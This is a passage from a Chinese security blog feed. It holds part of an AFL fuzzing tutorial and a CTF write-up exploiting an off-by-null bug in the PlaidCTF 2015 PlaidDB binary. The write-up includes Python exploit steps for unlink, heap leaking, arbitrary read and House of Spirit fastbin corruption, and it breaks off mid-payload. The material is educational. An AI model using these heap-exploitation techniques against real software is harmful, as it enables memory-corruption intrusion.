README.txt</code></pre><p>使用 <code>afl-tmin</code> 可以获得最小的测试样例：</p><pre><code class="bash">afl-tmin -i out/crashes/xxx -o min -Q -- ./binary</code></pre><h1 id="Plaid-CTF-2015-PlaidDB"><a href="#Plaid-CTF-2015-PlaidDB" class="headerlink" title="Plaid-CTF-2015-PlaidDB"></a>Plaid-CTF-2015-PlaidDB</h1><p>以之前的一道题目为例。使用 <code>afl-fuzz</code> 对程序进行测试，跑了一段时间后可以得到几个使 crash 的结果：</p><pre><code>➜  crashes xxd id:000000,sig:06,src:000000,op:havoc,rep:20000000: 5055 540a 410a 300a 4445 4c0a 410a 5055  PUT.A.0.DEL.A.PU0000010: 540a 4e4e 4e4e 4e4e 0a30 0a47 4554 0a41  T.NNNNNN.0.GET.A0000020: 415a 4141 4141 4141 4141 4141 4141 4141  AZAAAAAAAAAAAAAA0000030: 4141 4141 4155 540a 410a                 AAAAAUT.A.➜  crashes xxd id:000001,sig:06,src:000000,op:havoc,rep:40000000: 5055 540a 410a 300a 4445 4c0a 410a 5055  PUT.A.0.DEL.A.PU0000010: 540a 4e4e 4e4e 4e4e 0a30 0a47 4554 0a58  T.NNNNNN.0.GET.X0000020: 4141 ae41 4141 4141 4141 4141 4141 4141  AA.AAAAAAAAAAAAA0000030: 4141 4139 4155 540a 410a                 AAA9AUT.A.➜  crashes xxd id:000002,sig:06,src:000000,op:havoc,rep:20000000: 5055 540a 410a 300a 4445 4c0a 410a 5055  PUT.A.0.DEL.A.PU0000010: 540a 4e4e 5554 0a4e 0a30 0a47 4554 0a41  T.NNUT.N.0.GET.A0000020: 4141 410a 4e0a 300a 4745 540a 4141 4141  AAA.N.0.GET.AAAA0000030: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA0000040: 4141 4141 0a                             AAAA.</code></pre><p>然后用 <code>afl-tmin</code> 来将样例最小化：</p><pre><code class="bash">➜  Plaid-CTF-2015-PlaidDB xxd min0000000: 5055 540a 0a0a 5055 540a 0a0a 4745 540a  PUT...PUT...GET.0000010: 3030 3030 3030 3030 3030 3030 3030 3030  00000000000000000000020: 3030 3030 3030 3030 0a                   00000000.</code></pre><p>然后输入样例可以看到程序会 crash。发现程序在 free 的时候发现下一个 chunk 的 size 不合法，再经过一定的调试就可以定位到 Off-by-Null：</p><pre><code class="bash">➜  Plaid-CTF-2015-PlaidDB cat min | ./datastoreINFO: Welcome to the PlaidDB data storage service.INFO: Valid commands are GET, PUT, DUMP, DEL, EXITPROMPT: Enter command:PROMPT: Enter row key:PROMPT: Enter data size:PROMPT: Enter data:INFO: Insert successful.PROMPT: Enter command:PROMPT: Enter row key:PROMPT: Enter data size:PROMPT: Enter data:INFO: Update successful.PROMPT: Enter command:PROMPT: Enter row key:ERROR: Row not found.*** Error in `./datastore&#39;: free(): invalid next size (fast): 0x000055f7ab2a20f0 ***[1]    21002 done       cat min |       21003 abort      ./datastore</code></pre><h1 id="tcpdump-4-9-0"><a href="#tcpdump-4-9-0" class="headerlink" title="tcpdump-4.9.0"></a>tcpdump-4.9.0</h1><p>这里再对 64 位的 tcpdump-4.9.0 进行了测试。在安装 tcpdump 之前要先安装 libpcap：</p><pre><code class="bash">wget http://www.tcpdump.org/release/libpcap-1.8.1.tar.gztar -zxvf libpcap-1.8.1.tar.gz &amp;&amp; cd libpcap-1.8.1./configuremakesudo make install</code></pre><p>然后使用用 <code>afl-gcc</code> 和 <code>afl-g++</code> 对 tcpdump 进行编译：</p><pre><code class="bash">wget http://www.tcpdump.org/release/tcpdump-4.9.0.tar.gztar -zxvf tcpdump-4.9.0.tar.gz &amp;&amp; cd tcpdump-4.9.0CC=afl-gcc CXX=afl-g++ ./configuremakesudo make install</code></pre><p>安装完后查看以下版本：</p><pre><code class="bash">$ tcpdump --versiontcpdump version 4.9.0libpcap version 1.8.1</code></pre><p>然后从 <a href="https://wiki.wireshark.org/SampleCaptures" target="_blank" rel="noopener">Wireshark 官网</a>上下载一些流量包，作为测试的样例，并使用 editcap 将每个流量包分成四份：</p><pre><code class="bash">$ for i in `ls` ; do editcap -c 4 $i Trimmed/trimm.pcap ; done$ ls Trimmed/ | wc -l32170</code></pre><p>然后用 <code>alf-cmin</code> 把测试样例再缩小。需要从文件中获取输入的话，可以使用“@@”代替被测试程序命令行中输入文件名的位置：</p><pre><code class="bash">$ afl-cmin -i Trimmed/ -o Pcap-corpus/ -- tcpdump -ee -vv -nnr @@corpus minimization tool for afl-fuzz by &lt;lcamtuf@google.com&gt;[*] Testing the target binary...[+] OK, 377 tuples recorded.[*] Obtaining traces for input files in &#39;Trimmed/&#39;...    Processing file 32170/32170...[*] Sorting trace sets (this may take a while)...[+] Found 13843 unique tuples across 32170 files.[*] Finding best candidates for each tuple...    Processing file 32170/32170...[*] Sorting candidate list (be patient)...[*] Processing candidates and writing output files...    Processing tuple 13843/13843...[+] Narrowed down to 380 files, saved in &#39;Pcap-corpus/&#39;.</code></pre><p>最后使用 <code>afl-fuzz</code> 对程序测试，可以使用 <code>screen</code> 把程序放在后台运行：</p><pre><code class="bash">$ screen afl-fuzz -i PCAPS/Pcap-corpus/ -o out -- tcpdump -ee -vv -nnr @@</code></pre><p><a href="https://countuponsecurity.com/2018/03/07/intro-to-american-fuzzy-lop-fuzzing-in-5-steps/" target="_blank" rel="noopener">据说</a>能跑出 CVE（CVE-2017-13044 和 CVE-2017-12989），我用学生服务器跑了一个多礼拜跑出了五个 hangs。不得不说大型的 Fuzz 还是比较依赖机器的性能的：</p><p><img src="/pics/Fuzzing-to-Exploit/3.png" srcset="/img/loading.gif" alt></p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.youtube.com/watch?v=jEHgm7S58N8" target="_blank" rel="noopener">https://www.youtube.com/watch?v=jEHgm7S58N8</a><br><a href="https://cool-y.github.io/2019/07/09/afl-first-try/" target="_blank" rel="noopener">https://cool-y.github.io/2019/07/09/afl-first-try/</a><br><a href="https://mp.weixin.qq.com/s/G7l5wBB7oKjXCDGtjuxYTQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/G7l5wBB7oKjXCDGtjuxYTQ</a><br><a href="https://mp.weixin.qq.com/s/WMfCNN095-PpM0VB_pRESg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/WMfCNN095-PpM0VB_pRESg</a><br><a href="https://0x00sec.org/t/fuzzing-projects-with-american-fuzzy-lop-afl/6498" target="_blank" rel="noopener">https://0x00sec.org/t/fuzzing-projects-with-american-fuzzy-lop-afl/6498</a><br><a href="https://countuponsecurity.com/2018/03/07/intro-to-american-fuzzy-lop-fuzzing-in-5-steps/" target="_blank" rel="noopener">https://countuponsecurity.com/2018/03/07/intro-to-american-fuzzy-lop-fuzzing-in-5-steps/</a><br><a href="https://countuponsecurity.com/2018/04/24/intro-to-american-fuzzy-lop-fuzzing-with-asan-and-beyond/" target="_blank" rel="noopener">https://countuponsecurity.com/2018/04/24/intro-to-american-fuzzy-lop-fuzzing-with-asan-and-beyond/</a><br><a href="https://blog.betamao.me/2019/02/04/Fuzz%E4%B9%8BAFL/" target="_blank" rel="noopener">https://blog.betamao.me/2019/02/04/Fuzz%E4%B9%8BAFL/</a><br><a href="https://blog.csdn.net/hejunqing14/article/details/50338161" target="_blank" rel="noopener">https://blog.csdn.net/hejunqing14/article/details/50338161</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>fuzz</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2015-PlaidCTF-PlaidDB</title>
    <link href="/2020/04/12/2015-PlaidCTF-PlaidDB/"/>
    <url>/2020/04/12/2015-PlaidCTF-PlaidDB/</url>
    
    <content type="html"><![CDATA[<p>之前本来想写篇 Off-by-One 相关的，后来感觉理解了思想以后也不需要额外去多折腾什么了。这里记录一道比较复杂的题目。</p><a id="more"></a><h1 id="Binary-Analysis"><a href="#Binary-Analysis" class="headerlink" title="Binary Analysis"></a>Binary Analysis</h1><p>程序保护全开：</p><pre><code class="bash">➜  Plaid-CTF-2015-PlaidDB checksec ./datastore[*] &#39;/home/b3ale/Heap-Exploitation/Plaid-CTF-2015-PlaidDB/datastore&#39;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled    FORTIFY:  Enabled</code></pre><p>尝试运行一下程序，大概是模拟了一个数据库，总共有 5 个功能，分别是 GET、PUT、DUMP、DEL 和 EXIT。PUT 用来新增列，读入数据内容时会把换行符（<code>&quot;\n&quot;</code>）也读进来；GET 用来获取对应列的信息；DUMP 获取所有被存入的列；DEL 删除列；EXIT 退出程序：</p><pre><code class="bash">➜  Plaid-CTF-2015-PlaidDB ./datastoreINFO: Welcome to the PlaidDB data storage service.INFO: Valid commands are GET, PUT, DUMP, DEL, EXITPROMPT: Enter command:PUTPROMPT: Enter row key:AAAPROMPT: Enter data size:4PROMPT: Enter data:AAAAINFO: Insert successful.PROMPT: Enter command:ERROR: &#39;&#39; is not a valid command.PROMPT: Enter command:GETPROMPT: Enter row key:AAAINFO: Row data [4 bytes]:AAAAPROMPT: Enter command:DUMPINFO: Dumping all rows.INFO: Row [AAA], 4 bytesINFO: Row [th3fl4g], 8 bytesPROMPT: Enter command:DELPROMPT: Enter row key:th3fl4gINFO: Delete successful.PROMPT: Enter command:DUMPINFO: Dumping all rows.INFO: Row [AAA], 4 bytesPROMPT: Enter command:EXITINFO: Goodbye</code></pre><p>先用 IDA 来大概看看函数的大概实现。大体就是菜单题的样子，然后大概是用红黑树对数据进行存储，所以我站在前人的肩膀上把结构体改好了：</p><pre><code class="cpp">struct Node {    char *key;    long data_size;    char *data;    struct Node *left;    struct Node *right;    long dummy;    long dummy1;}</code></pre><p>其中 get 函数一开始获取输入的列名（这里我已经标出了 <code>vulread()</code>，在后面会再提到），然后遍历红黑树节点，对读入的 key 和指定节点上的 key 进行比较，如果相等的话会输出相应的 data。最后会把 key 的缓存给 free 掉：</p><pre><code class="cpp">void get(){  char *key; // rbp  struct Node *node; // rbx  int cmp_result; // eax  puts(&quot;PROMPT: Enter row key:&quot;);  key = vulread();  node = root;LABEL_2:  if ( node )  {    while ( 1 )    {      cmp_result = strcmp(key, node-&gt;key);      if ( cmp_result &lt; 0 )      {        node = node-&gt;left;        goto LABEL_2;      }      if ( !cmp_result )        break;      node = node-&gt;right;      if ( !node )        goto LABEL_6;    }    __printf_chk(1LL, &quot;INFO: Row data [%zd byte%s]:\n&quot;, node-&gt;data_size);    fwrite(node-&gt;data, 1uLL, node-&gt;data_size, stdout);    free(key);  }  else  {LABEL_6:    puts(&quot;ERROR: Row not found.&quot;);    free(key);  }}</code></pre><p>在 put 函数中，先读入一个 key，然后读入（saferead 中调用 fgets）数据的长度，然后读入指定长度的字符串（readn 用 read 实现）。最后把读入的结构体添加到红黑树中，在 insert_node 中判断节点是否出现过，若出现过就会 free 掉当前的节点，并更新旧的节点；若没有，则插入红黑树：</p><pre><code class="cpp">void put(){  void **chunk; // rbx  unsigned __int64 size; // rax  void *buf; // rax  struct Node *v3; // rbp  char size_1[24]; // [rsp+0h] [rbp-38h]  unsigned __int64 canary; // [rsp+18h] [rbp-20h]  canary = __readfsqword(0x28u);  chunk = (void **)malloc(0x38uLL);  if ( !chunk )    goto LABEL_10;  puts(&quot;PROMPT: Enter row key:&quot;);  *chunk = vulread();  puts(&quot;PROMPT: Enter data size:&quot;);  saferead(size_1, 16LL);  size = strtoul(size_1, 0LL, 0);  chunk[1] = (void *)size;  buf = malloc(size);  chunk[2] = buf;  if ( !buf )  {    puts(&quot;ERROR: Can&#39;t store that much data.&quot;);    free(*chunk);    if ( __readfsqword(0x28u) == canary )    {      free(chunk);      return;    }LABEL_10:    puts(&quot;FATAL: Can&#39;t allocate a row&quot;);    exit(-1);  }  puts(&quot;PROMPT: Enter data:&quot;);  readn(chunk[2], (size_t)chunk[1]);  v3 = (struct Node *)insert_node(chunk);  if ( v3 )  {    free(*chunk);    free(v3-&gt;data);    v3-&gt;data_size = (__int64)chunk[1];    v3-&gt;data = (char *)chunk[2];    free(chunk);    puts(&quot;INFO: Update successful.&quot;);  }  else  {    puts(&quot;INFO: Insert successful.&quot;);  }  if ( __readfsqword(0x28u) != canary )    goto LABEL_10;}</code></pre><p>dump 函数后序遍历红黑树并输出列名和数据长度：</p><pre><code class="cpp">struct Node *dump(){  struct Node *result; // rax  struct Node *node; // rbx  struct Node *n; // rax  puts(&quot;INFO: Dumping all rows.&quot;);  result = (struct Node *)&amp;root;  node = root;  if ( !root )    return result;  while ( node-&gt;left )    node = node-&gt;left;  while ( 1 )  {    while ( 1 )    {      node-&gt;data_size;      __printf_chk(1LL, &quot;INFO: Row [%s], %zd byte%s\n&quot;, node-&gt;key);      n = node-&gt;right;      if ( !n )        break;      do      {        node = n;        n = n-&gt;left;      }      while ( n );    }    result = node-&gt;dummy;    if ( !result || node != result-&gt;left )      break;LABEL_15:    node = result;  }  while ( result )  {    if ( node != result-&gt;right )      goto LABEL_15;    node = result;    result = result-&gt;dummy;  }  return result;}</code></pre><p>最后的 del 函数比较复杂，就不放太多代码了，因为主要操作是从红黑树中删除节点，最后会依次 free 掉节点的 key、节点的 data、节点本身以及输入的 key。不过如果没有找到指定的列，就不会把输入的 key 给 free 掉：</p><pre><code class="cpp">int del(){  puts(&quot;PROMPT: Enter row key:&quot;);  key = vulread();  node = root;LABEL_2:  if ( !node )  {LABEL_6:    puts(&quot;ERROR: Row not found.&quot;);    return;  }  while ( 1 )  {    key_1 = node-&gt;key;  ...LABEL_69:  LODWORD(n-&gt;dummy1) = 0;LABEL_29:  free(key_1);  free(node-&gt;data);  free(node);  free(key);  return puts(&quot;INFO: Delete successful.&quot;);}</code></pre><p>最后来看 vulread 这里，逐字节读取字符，判断如果读到换行符就 break。如果读入的长度大于 24，则会用 realloc 扩展一倍 chunk 的大小。读完指定长度之后会在字符串最后补上 <code>&quot;\x00&quot;</code>：</p><pre><code class="cpp">char *vulread(){  char *buf; // r12  char *end; // rbx  size_t cap; // r14  char c; // al  char c_1; // bp  signed __int64 idx; // r13  char *new_buf; // rax  buf = (char *)malloc(8uLL);  end = buf;  cap = malloc_usable_size(buf);                // 24  while ( 1 )  {    c = _IO_getc(stdin);    c_1 = c;    if ( c == -1 )      goodbye();    if ( c == &#39;\n&#39; )      break;    idx = end - buf;    if ( cap &lt;= end - buf )    {      new_buf = (char *)realloc(buf, 2 * cap);      buf = new_buf;      if ( !new_buf )      {        puts(&quot;FATAL: Out of memory&quot;);        exit(-1);      }      end = &amp;new_buf[idx];      cap = malloc_usable_size(new_buf);        // 48    }    *end++ = c_1;  }  *end = 0;                                   // off by one  return buf;}</code></pre><p>再用 ltrace 跟一下，大概地看看发生了哪些 malloc 和 free：</p><pre><code class="bash">➜  Plaid-CTF-2015-PlaidDB ltrace -e &#39;malloc+free+realloc+&#39; ./datastoredatastore-&gt;malloc(56)                                                   = 0x564b295ad010datastore-&gt;malloc(8)                                                    = 0x564b295ad050datastore-&gt;malloc(9)                                                    = 0x564b295ad070INFO: Welcome to the PlaidDB data storage service.INFO: Valid commands are GET, PUT, DUMP, DEL, EXITPROMPT: Enter command:PUTdatastore-&gt;malloc(56)                                                   = 0x564b295ad090PROMPT: Enter row key:datastore-&gt;malloc(8)                                                    = 0x564b295ad0d0APROMPT: Enter data size:0datastore-&gt;malloc(0)                                                    = 0x564b295ad0f0PROMPT: Enter data:INFO: Insert successful.PROMPT: Enter command:DELPROMPT: Enter row key:datastore-&gt;malloc(8)                                                    = 0x564b295ad110Adatastore-&gt;free(0x564b295ad0d0)                                         = &lt;void&gt;datastore-&gt;free(0x564b295ad0f0)                                         = &lt;void&gt;datastore-&gt;free(0x564b295ad090)                                         = &lt;void&gt;datastore-&gt;free(0x564b295ad110)                                         = &lt;void&gt;INFO: Delete successful.PROMPT: Enter command:DUMPINFO: Dumping all rows.INFO: Row [th3fl4g], 8 bytesPROMPT: Enter command:EXITINFO: Goodbye+++ exited (status 0) +++</code></pre><h1 id="Vulnerability-Analysis"><a href="#Vulnerability-Analysis" class="headerlink" title="Vulnerability Analysis"></a>Vulnerability Analysis</h1><p>根据上面的分析，有用的信息大概如下几个：</p><ol><li>每个节点固定大小（<code>malloc(56)</code>）；</li><li><code>vulread()</code> 函数中有 <code>malloc()</code> 和 <code>realloc()</code>，可以用 <code>realloc()</code> 获取特定大小的 chunk；</li><li><code>vulread()</code> 里存在 Off by Null；</li><li>删除节点时，如果列名不存在，key 所对应的 chunk 不会被 free；</li><li>往节点中读入数据时的大小可控（<code>malloc(size)</code>）。插入节点时会进行判断，若新节点的 key 值不存在，则插入节点；若存在，则依次 free 新的 key、旧的 data、新的节点。存在节点时的 free 顺序如下：</li></ol><pre><code class="bash">➜  Plaid-CTF-2015-PlaidDB ltrace -e &#39;malloc+free+realloc+&#39; ./datastoredatastore-&gt;malloc(56)                                                   = 0x55feff2f2010datastore-&gt;malloc(8)                                                    = 0x55feff2f2050datastore-&gt;malloc(9)                                                    = 0x55feff2f2070INFO: Welcome to the PlaidDB data storage service.INFO: Valid commands are GET, PUT, DUMP, DEL, EXITPROMPT: Enter command:PUTdatastore-&gt;malloc(56)                                                   = 0x55feff2f2090PROMPT: Enter row key:datastore-&gt;malloc(8)                                                    = 0x55feff2f20d0APROMPT: Enter data size:2datastore-&gt;malloc(2)                                                    = 0x55feff2f20f0PROMPT: Enter data:AINFO: Insert successful.PROMPT: Enter command:PUTdatastore-&gt;malloc(56)                                                   = 0x55feff2f2110PROMPT: Enter row key:datastore-&gt;malloc(8)                                                    = 0x55feff2f2150APROMPT: Enter data size:2datastore-&gt;malloc(2)                                                    = 0x55feff2f2170PROMPT: Enter data:Bdatastore-&gt;free(0x55feff2f2150)                                         = &lt;void&gt;datastore-&gt;free(0x55feff2f20f0)                                         = &lt;void&gt;datastore-&gt;free(0x55feff2f2110)                                         = &lt;void&gt;INFO: Update successful.PROMPT: Enter command:EXITINFO: Goodbye+++ exited (status 0) +++</code></pre><p>看过一遍后，漏洞点其实就在 <code>vulread()</code> 中。如果正好读满 24 字节，然后跟上换行，还会在最后面跟上一个 <code>&quot;\x00&quot;</code>，造成 Off by One（Off by Null）。不过找漏洞还有一种方法。本身程序这里红黑树的操作比较复杂，如果在不知道的情况下单纯地去逆会很难。所以可以对程序进行 Fuzz 来定位漏洞。用 AFL Fuzz 后可以得到会让程序 Crash 的 Payload：</p><pre><code>PUTA0DELAPUTNNNNNN0PUTAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</code></pre><p>可以看到在 free 的时候提示了 <code>&quot;free(): invalid next size (fast)&quot;</code>，再经过一系列的调试就能判断出应该是溢出的 Null 字节盖到了下一个 chunk 的 size：</p><pre><code>➜  Plaid-CTF-2015-PlaidDB (cat crash.txt ; cat) | ./datastoreINFO: Welcome to the PlaidDB data storage service.INFO: Valid commands are GET, PUT, DUMP, DEL, EXITPROMPT: Enter command:PROMPT: Enter row key:PROMPT: Enter data size:PROMPT: Enter data:INFO: Insert successful.PROMPT: Enter command:PROMPT: Enter row key:INFO: Delete successful.PROMPT: Enter command:PROMPT: Enter row key:PROMPT: Enter data size:GETPROMPT: Enter data:INFO: Insert successful.PROMPT: Enter command:GETPROMPT: Enter row key:AAAAAAAAAAAAAAAAAAAAAAAAERROR: Row not found.cat: -: Resource temporarily unavailable*** Error in `./datastore&#39;: free(): invalid next size (fast): 0x00005555557580d0 ***</code></pre><p>这里的 Off by Null 可以溢出盖到下一个 chunk 的 size 的最低一个字节，使得该 chunk 的 <strong>size 变小</strong>（shrink），同时也把 <strong>prev_inuse 置为 0</strong>；同时可以<strong>设置下一个 chunk 的 prev_size</strong>，然后就可以 unlink 拿到某个指针了。画了个草图，这里通过 chunk2 溢出修改 chunk3 的 prev_size 以及覆盖 size 的最低字节为 Null，将 chunk3 的 prev_inuse 置零的同时 shrink：</p><pre><code>                                    prev                            prev             size                   size     size                   size     size +--------+--------+-------------+--------+------+-+-------------+--------+--------+-------------+ |        |   XX   |chunk1(freed)|   XX   |   XX |0|    chunk2   |   XX   |  XX+1|1|    chunk3   | +--------+--------+-------------+--------+------+-+-------------+--------+--------+-------------+   prev   size     size +--------+--------+-------------+--------+--------+-------------+--------+--------+--------+----+ |        |        |             |        |        |AAAAAAAAAAAAA|  2*XX  |   YY |0|        |    | +--------+--------+-------------+--------+--------+-------------+--------+--------+--------+----+</code></pre><p>实现这样的构造之后，可以通过 GET 把 unlink 后的得到的 chunk 覆盖到的节点信息泄漏出来。然后可以把这个 chunk 作为 value，可以读入任意的数据，构造一些指针作为节点的结构体成员，用 GET 就可以任意读，用 PUT 可以任意写。</p><h1 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h1><p>下面大概记录一下怎么构造出 unlink。首先利用几个 PUT 对堆进行初步的布局：</p><pre><code class="python"># Off by Null + UnlinkPUT(&#39;3&#39;, &#39;&#39;)PUT(&#39;0&#39;, &#39;C&#39; * 0x80) # smallbin for unlinkPUT(&#39;1&#39;, &#39;&#39;) # chunk for overflowPUT(&#39;2&#39;, &#39;&#39;)PUT(&#39;1&#39;, &#39;A&#39; * 0xf8)</code></pre><p>结果大概如下，列 <code>&#39;1&#39;</code> 对应的部分会在最后一次 PUT 的时候被替换掉内容，会依次 free 掉 0x3a0、0x2c0、0x360 处的 chunk：</p><pre><code> +------------+ 0x0f0 - 0x10 |    0x40    | node &#39;3&#39; +------------+ 0x130 - 0x10 |    0x20    | &#39;3&#39; +------------+ 0x150 - 0x10 |    0x20    | &#39;&#39; +------------+ 0x170 - 0x10 |    0x40    | node &#39;0&#39; +------------+ 0x1b0 - 0x10 |    0x20    | &#39;0&#39; +------------+ 0x1d0 - 0x10 |    0x90    | &#39;C&#39; * 0x80 +------------+ 0x260 - 0x10 |    0x40    | node &#39;1&#39; +------------+ 0x2a0 - 0x10 |    0x20    | &#39;1&#39; +------------+ 0x2c0 - 0x10 |    0x20    | &#39;&#39; =&gt; [freed] +------------+ 0x2e0 - 0x10 |    0x40    | node &#39;2&#39; +------------+ 0x320 - 0x10 |    0x20    | &#39;2&#39; +------------+ 0x340 - 0x10 |    0x20    | &#39;&#39; +------------+ 0x360 - 0x10 |    0x40    | node &#39;1&#39; =&gt; [freed] +------------+ 0x3a0 - 0x10 |    0x20    | &#39;1&#39; =&gt; [freed] +------------+ 0x3c0 - 0x10 |   0x100    | &#39;A&#39; * 0xf8 +------------+</code></pre><p>接下来 PUT 列 <code>&#39;2&#39;</code> 中的内容，用于之后的 unlink，同时伪造了一个 fastbin chunk，之后避免之后 shrink+free 后和 top chunk 合并：</p><pre><code class="python">PUT(&#39;2&#39;, &#39;B&#39; * 0xf8 + p64(0x21) + &#39;C&#39; * 0x18) # chunk for off-by-null ; fake a fastbin</code></pre><p>堆内存大概如下，此时有两个 0x20 的 fastbin 和一个 0x40 的 fastbin：</p><pre><code> +------------+ 0x0f0 - 0x10 |    0x40    | node &#39;3&#39; +------------+ 0x130 - 0x10 |    0x20    | &#39;3&#39; +------------+ 0x150 - 0x10 |    0x20    | &#39;&#39; +------------+ 0x170 - 0x10 |    0x40    | node &#39;0&#39; +------------+ 0x1b0 - 0x10 |    0x20    | &#39;0&#39; +------------+ 0x1d0 - 0x10 |    0x90    | &#39;C&#39; * 0x80 +------------+ 0x260 - 0x10 |    0x40    | node &#39;1&#39; +------------+ 0x2a0 - 0x10 |    0x20    | &#39;1&#39; +------------+ 0x2c0 - 0x10 |    0x20    | &#39;2&#39; -&gt; [freed] +------------+ 0x2e0 - 0x10 |    0x40    | node &#39;2&#39; +------------+ 0x320 - 0x10 |    0x20    | &#39;2&#39; +------------+ 0x340 - 0x10 |    0x20    | &#39;&#39; =&gt; [freed] +------------+ 0x360 - 0x10 |    0x40    | node &#39;2&#39; =&gt; [freed] +------------+ 0x3a0 - 0x10 |    0x20    | [freed] +------------+ 0x3c0 - 0x10 |   0x100    | &#39;A&#39; * 0xf8 +------------+ 0x4c0 - 0x10 |   0x120    | &#39;B&#39; * 0xf8 + p64(0x21) + &#39;C&#39; * 0x18 +------------+</code></pre><p>然后接下来触发 Off-by-Null，并且：</p><pre><code class="python">DEL(&#39;1&#39;)DEL(&#39;X&#39; * 240 + p64(0x4c0 - 0x1d0)) # off-by-null(shrink) ; set prev_size=752DEL(&#39;0&#39;)DEL(&#39;2&#39;) # unlink</code></pre><p>smallbin 里会产生一块很大的 chunk，接下来就能 overlap 其中的 chunk，进行任意读、任意写：</p><pre><code> +------------+ 0x0f0 - 0x10                                    +------------+ |    0x40    | node &#39;3&#39;                                        |    0x40    | +------------+ 0x130 - 0x10                                    +------------+ |    0x20    | &#39;3&#39;                                             |    0x20    | +------------+ 0x150 - 0x10                                    +------------+ |    0x20    | &#39;&#39;                                              |    0x20    | +------------+ 0x170 - 0x10                                    +------------+ |    0x40    | node &#39;0&#39; =&gt; [freed]                             |    0x40    | +------------+ 0x1b0 - 0x10                                    +------------+ |    0x20    | &#39;0&#39; =&gt; [freed]                                  |    0x20    | +------------+ 0x1d0 - 0x10                       0x1d0 - 0x10 +------------+ |    0x90    | &#39;C&#39; * 0x80 =&gt; [freed]                           |   0x3f0    | +------------+ 0x260 - 0x10                                    +---- :: ----+ |    0x40    | node &#39;1&#39; =&gt; [freed]                             |     ::     | +------------+ 0x2a0 - 0x10                                    +---- :: ----+ |    0x20    | &#39;1&#39; =&gt; [freed]                                  |     ::     | +------------+ 0x2c0 - 0x10                                    +---- :: ----+ |    0x20    | [freed]                                         |     ::     | +------------+ 0x2e0 - 0x10                                    +---- :: ----+ |    0x40    | node &#39;2&#39; =&gt; [freed]                             |     ::     | +------------+ 0x320 - 0x10                                    +---- :: ----+ |    0x20    | &#39;2&#39; =&gt; [freed]                                  |     ::     | +------------+ 0x340 - 0x10                                    +---- :: ----+ |    0x20    | [freed]                                         |     ::     | +------------+ 0x360 - 0x10                                    +---- :: ----+ |    0x40    | [freed]                                         |     ::     | +------------+ 0x3a0 - 0x10                                    +---- :: ----+ |    0x20    | [freed]                                         |     ::     | +------------+ 0x3c0 - 0x10                       0x3c0 - 0x10 +---- :: ----+ |   0x100    | &#39;X&#39; * 0xf8                           &#39;X&#39; * 0xf8 |     ::     | +------------+ 0x4c0 - 0x10                                    +---- :: ----+ |   0x120    | &#39;B&#39; * 0xf8 + p64(0x21) + &#39;C&#39; * 0x18 =&gt; [freed]  |     ::     | +------------+                                    0x5c0 - 0x10 +------------+                                                     &#39;C&#39; * 0x18 |    0x20    |                                                                +------------+</code></pre><p>利用 PUT 泄漏出 heap，并且能构造一个泄漏函数：</p><pre><code class="python"># Leak Heap AddressDEL(&#39;3&#39;) # put a previous node chunk into fastbinPUT(&#39;KEY1&#39;, (&#39;A&#39; * 0x108 +    p64(0x40) + p64(0) + &#39;D&#39; * 0x30 +    p64(0x21) + p64(0) + &#39;C&#39; * 0x10 +    p64(0x21) + &#39;KEY1\x00&#39;).ljust(1000, &#39;Q&#39;))PUT(&#39;LEAKBUF&#39;, &#39;&#39;)data = GET(&#39;KEY1&#39;)heap_base = u64(data[0x110:0x118]) - 0x150info(&#39;heap_base = &#39; + hex(heap_base))# Function for Leaking Memorydef leak(addr, size):    PUT(&#39;KEY1&#39;, &#39;A&#39; * 0x3e8)    PUT(&#39;KEY1&#39;, data[:0x118] + p64(size) + p64(addr) + data[0x128:])    return GET(&#39;LEAKBUF&#39;)</code></pre><p>LEAKBUF 在内存中的布局如下，LEAKBUF 的结构体中的 data 和 data_size 可以被 overlap，再用 PUT 泄漏：</p><pre><code> +------------+ 0x0f0 - 0x10 |    0x40    | node &#39;3&#39; =&gt; [freed] =&gt; node &#39;KEY1&#39; +------------+ 0x130 - 0x10 |    0x20    | &#39;3&#39; =&gt; [freed] =&gt; &#39;&#39; +------------+ 0x150 - 0x10 |    0x20    | &#39;&#39; =&gt; [freed] =&gt; &#39;LEAKBUF&#39; +------------+ 0x170 - 0x10 |    0x40    | [freed] +------------+ 0x1b0 - 0x10 |    0x20    | [freed] +------------+ 0x1d0 - 0x10 |   0x3f0    | [freed] =&gt; chunk +---- :: ----+ 0x260 - 0x10 |     ::     | [freed] +---- :: ----+ 0x2a0 - 0x10 |     ::     | [freed] +---- :: ----+ 0x2c0 - 0x10 |     ::     | [freed] +---- :: ----+ 0x2e0 - 0x10 |   [0x40]   | [freed] =&gt; node &#39;LEAKBUF&#39; +---- :: ----+ 0x320 - 0x10 |   [0x20]   | [freed] +---- :: ----+ 0x340 - 0x10 |   [0x20]   | [freed] =&gt; &#39;KEY1&#39; +---- :: ----+ 0x360 - 0x10 |     ::     | [freed] +---- :: ----+ 0x3a0 - 0x10 |     ::     | [freed] +---- :: ----+ 0x3c0 - 0x10 |     ::     | &#39;X&#39; * 0xf8 +---- :: ----+ 0x4c0 - 0x10 |     ::     | [freed] +------------+ 0x5c0 - 0x10 |    0x20    | &#39;C&#39; * 0x18 +------------+</code></pre><p>接下来构造一个假的 fastbin chunk 来进行 House-of-Spirit，然后改掉它的 fd 指针：</p><pre><code class="python"># House of Spirit + Fastbin Corruption + ROPPUT(&#39;KEY1&#39;, &#39;A&#39; * 0x3e8)PUT(&#39;KEY1&#39;, (&#39;A&#39; * 0x108 +    p64(0x40) + p64(heap_base + 0x3e0) + # point LEAKBUF&#39;s key to &#39;P\x00&#39;    p64(0x64) + p64(0) + p64(0) + p64(0) + p64(0) +    p64(0x40) + p64(0x40) + &#39;KEY1\x00&#39;.ljust(0x38, &#39;A&#39;) + # 0x358    p64(0x40) + &#39;A&#39; * 0x78 + # 0x3d8    p64(0x40) + &#39;P\x00&#39;.ljust(0x38, &#39;A&#39;) + p64(0x41)).ljust(0x3e8, 